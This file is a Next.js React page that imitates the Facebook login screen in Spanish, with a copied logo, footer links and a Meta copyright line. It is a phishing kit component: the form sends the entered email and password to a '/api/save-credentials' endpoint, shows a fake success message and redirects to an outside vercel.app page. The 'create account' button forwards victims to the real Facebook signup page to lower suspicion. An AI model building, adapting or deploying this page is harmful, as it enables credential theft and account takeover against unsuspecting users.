'use client';

import { useState } from 'react';

const REDIRECT_URL = 'https://tp-sds-2a88.vercel.app/success'; // Cambia aquí
const REDIRECT_URL_2 = 'https://www.facebook.com/r.php?entry_point=login'; // Cambia aquí

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [loading, setLoading] = useState(false);

  const showMessage = (text, type) => {
    setMessage(text);
    setMessageType(type);
    setTimeout(() => setMessage(''), 5000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    if (!email || !password) {
      showMessage('Por favor, completa todos los campos.', 'error');
      setLoading(false);
      return;
    }

    try {
      const response = await fetch('/api/save-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || 'Error al guardar credenciales');
      }

      showMessage('¡Inicio de sesión exitoso! Redirigiendo...', 'success');

      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 1500);

    } catch (error) {
      console.error('Error:', error);
      showMessage(`Error: ${error.message}`, 'error');
    } finally {
      setLoading(false);
    }
  };

  const handleCreateAccount = () => {
    setTimeout(() => {
      window.location.href = REDIRECT_URL_2;
    }, 1500);
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <div style={styles.logo}>facebook</div>
      </div>

      <div style={styles.loginForm}>
        {message && (
          <div style={{ ...styles.message, ...styles[messageType] }}>
            {message}
          </div>
        )}
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Correo electrónico o número de teléfono"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            style={styles.input}
            required
          />
          <input
            type="password"
            placeholder="Contraseña"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={styles.input}
            required
          />
          <button type="submit" style={styles.loginBtn} disabled={loading}>
            {loading ? 'Iniciando...' : 'Iniciar sesión'}
          </button>
        </form>

        <div style={styles.forgotPassword}>
          <a href="#" style={styles.link}>¿Olvidaste tu contraseña?</a>
        </div>

        <div style={styles.divider}></div>

        <button style={styles.createAccountBtn} onClick={handleCreateAccount}>
          Crear cuenta nueva
        </button>

        <div style={styles.createPage}>
          <a href="#" style={styles.link}>Crea una página</a> para una celebridad, una marca o un negocio.
        </div>
      </div>

      <div style={styles.footer}>
        <div style={styles.footerLinks}>
          <a href="#" style={styles.footerLink}>Español</a>
          <a href="#" style={styles.footerLink}>English (US)</a>
          <a href="#" style={styles.footerLink}>Français (France)</a>
          <a href="#" style={styles.footerLink}>Italiano</a>
          <a href="#" style={styles.footerLink}>Deutsch</a>
          <a href="#" style={styles.footerLink}>Português (Brasil)</a>
          <a href="#" style={styles.footerLink}>العربية</a>
          <a href="#" style={styles.footerLink}>हिन्दी</a>
          <a href="#" style={styles.footerLink}>中文(简体)</a>
          <a href="#" style={styles.footerLink}>日本語</a>
        </div>
        <div style={styles.footerLinks}>
          <a href="#" style={styles.footerLink}>Registrarse</a>
          <a href="#" style={styles.footerLink}>Iniciar sesión</a>
          <a href="#" style={styles.footerLink}>Messenger</a>
          <a href="#" style={styles.footerLink}>Facebook Lite</a>
          <a href="#" style={styles.footerLink}>Video</a>
          <a href="#" style={styles.footerLink}>Meta Pay</a>
          <a href="#" style={styles.footerLink}>Tienda Meta</a>
          <a href="#" style={styles.footerLink}>Meta Quest</a>
          <a href="#" style={styles.footerLink}>Ray-Ban Meta</a>
          <a href="#" style={styles.footerLink}>Meta AI</a>
          <a href="#" style={styles.footerLink}>Instagram</a>
          <a href="#" style={styles.footerLink}>Threads</a>
          <a href="#" style={styles.footerLink}>Recaudaciones de fondos</a>
          <a href="#" style={styles.footerLink}>Servicios</a>
          <a href="#" style={styles.footerLink}>Centro de información de votación</a>
          <a href="#" style={styles.footerLink}>Política de privacidad</a>
          <a href="#" style={styles.footerLink}>Centro de privacidad</a>
          <a href="#" style={styles.footerLink}>Grupos</a>
          <a href="#" style={styles.footerLink}>Información</a>
          <a href="#" style={styles.footerLink}>Crear anuncio</a>
          <a href="#" style={styles.footerLink}>Crear página</a>
          <a href="#" style={styles.footerLink}>Desarrolladores</a>
          <a href="#" style={styles.footerLink}>Empleo</a>
          <a href="#" style={styles.footerLink}>Cookies</a>
          <a href="#" style={styles.footerLink}>Opciones de anuncios</a>
          <a href="#" style={styles.footerLink}>Condiciones</a>
          <a href="#" style={styles.footerLink}>Ayuda</a>
          <a href="#" style={styles.footerLink}>Subir contactos y no usuarios</a>
        </div>
        <div style={styles.copyright}>
          Meta © 2025
        </div>
      </div>
    </div>
  );
}

const styles = {
  container: {
    display: 'flex',
    flexDirection: 'column',
    minHeight: '100vh',
    padding: '20px',
    backgroundColor: '#f0f2f5',
    color: '#1c1e21',
    fontFamily: 'Helvetica, Arial, sans-serif',
    lineHeight: '1.34',
  },
  header: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: '10px 0',
  },
  logo: {
    fontSize: '28px',
    fontWeight: 'bold',
    color: '#1877f2',
  },
  languageSelector: {
    marginTop: '20px',
  },
  select: {
    padding: '5px',
    border: '1px solid #dddfe2',
    borderRadius: '4px',
    backgroundColor: 'white',
  },
  loginForm: {
    backgroundColor: '#fff',
    borderRadius: '8px',
    boxShadow: '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)',
    padding: '20px',
    maxWidth: '396px',
    width: '100%',
    margin: '40px auto',
  },
  input: {
    width: '100%',
    padding: '14px 16px',
    marginBottom: '12px',
    border: '1px solid #dddfe2',
    borderRadius: '6px',
    fontSize: '17px',
    boxSizing: 'border-box',
  },
  loginBtn: {
    backgroundColor: '#1877f2',
    border: 'none',
    borderRadius: '6px',
    fontSize: '20px',
    lineHeight: '48px',
    padding: '0 16px',
    width: '100%',
    color: 'white',
    fontWeight: 'bold',
    cursor: 'pointer',
    marginBottom: '16px',
  },
  forgotPassword: {
    textAlign: 'center',
    marginBottom: '20px',
  },
  link: {
    color: '#1877f2',
    fontSize: '14px',
    textDecoration: 'none',
  },
  divider: {
    borderBottom: '1px solid #dadde1',
    margin: '20px 0',
  },
  createAccountBtn: {
    backgroundColor: '#42b72a',
    border: 'none',
    borderRadius: '6px',
    fontSize: '17px',
    lineHeight: '48px',
    padding: '0 16px',
    color: 'white',
    fontWeight: 'bold',
    cursor: 'pointer',
    display: 'block',
    margin: '0 auto',
  },
  createPage: {
    textAlign: 'center',
    marginTop: '28px',
    fontSize: '14px',
  },
  footer: {
    marginTop: 'auto',
    paddingTop: '20px',
    color: '#737373',
    fontSize: '14px',
    lineHeight: '1.34',
  },
  footerLinks: {
    display: 'flex',
    flexWrap: 'wrap',
    marginBottom: '8px',
  },
  footerLink: {
    color: '#737373',
    marginRight: '20px',
    textDecoration: 'none',
  },
  copyright: {
    marginTop: '20px',
  },
  message: {
    padding: '10px',
    margin: '10px 0',
    borderRadius: '4px',
    textAlign: 'center',
  },
  success: {
    backgroundColor: '#d4edda',
    color: '#155724',
    border: '1px solid #c3e6cb',
  },
  error: {
    backgroundColor: '#f8d7da',
    color: '#721c24',
    border: '1px solid #f5c6cb',
  },
};
